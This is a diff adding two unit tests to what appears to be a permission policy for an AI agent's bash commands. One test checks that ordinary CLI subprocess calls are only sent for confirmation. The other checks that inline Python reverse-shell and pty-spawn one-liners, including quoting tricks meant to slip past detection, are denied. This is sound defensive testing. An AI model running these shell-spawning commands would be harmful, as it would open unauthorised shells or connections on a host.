@@ -239,6 +239,30 @@ def test_package_python_socket_only_inline() -> None:
     assert "shell_reverse_shell_or_bind_shell" not in (matched or "")
 
 
+def test_normal_cli_subprocess_requires_confirmation_instead_of_reverse_shell_denial() -> None:
+    for command in (
+        '''python -c "import subprocess; subprocess.run(['lark-cli','docs','+create','--title','example'])"''',
+        '''python -c "import subprocess; subprocess.run(['lark-cli','calendar','+agenda'])"''',
+    ):
+        level, matched = evaluate_tiered_policy(_package_cfg(), "bash", {"command": command})
+        assert level == PermissionLevel.ASK, (command, matched)
+        assert "shell_reverse_shell_or_bind_shell" not in (matched or "")
+
+
+def test_inline_python_network_shell_is_still_denied_after_subprocess_import() -> None:
+    for command in (
+        '''python -c "import subprocess; import socket; s=socket.socket(); s.connect(('example.invalid',4444))"''',
+        "python -c 'import subprocess; import pty; pty.spawn(\"/bin/sh\")'",
+        'python -c"import socket"',
+        "python -c'import pty; pty.spawn(\"/bin/sh\")'",
+        "python -c $'import socket'",
+        'python -c$"import pty; pty.spawn(\'/bin/sh\')"',
+    ):
+        level, matched = evaluate_tiered_policy(_package_cfg(), "bash", {"command": command})
+        assert level == PermissionLevel.DENY, (command, matched)
+        assert "shell_reverse_shell_or_bind_shell" in matched
+
+
 def test_package_encoded_command_not_ffmpeg_enc() -> None:
     cfg = _package_cfg()
     level, matched = evaluate_tiered_policy(
